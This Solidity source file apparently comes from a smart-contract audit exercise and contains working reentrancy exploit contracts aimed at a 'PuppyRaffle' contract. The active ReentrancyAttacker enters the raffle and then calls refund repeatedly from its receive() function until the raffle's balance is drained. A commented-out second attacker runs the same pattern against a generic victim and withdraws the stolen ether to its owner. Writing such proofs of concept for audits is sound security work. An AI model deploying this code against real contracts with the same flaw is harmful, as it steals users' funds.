// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;

//import {Test, console} from "lib/forge-std/src/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}
/*
contract ReentrancyAttacker2 {
    ReentrancyVictim victim;
    address public owner;

    constructor(ReentrancyVictim _victim) {
        victim = _victim;
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Fuck off !!!");
        _;
    }

    function attack() public payable onlyOwner {
        victim.deposit{value: 1 ether}();
        victim.withdrawBalance();
    }

    function withdrawCash() public onlyOwner {
        uint256 balance = address(this).balance;

        (bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert();
        }
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdrawBalance();
        }
    }
}
*/
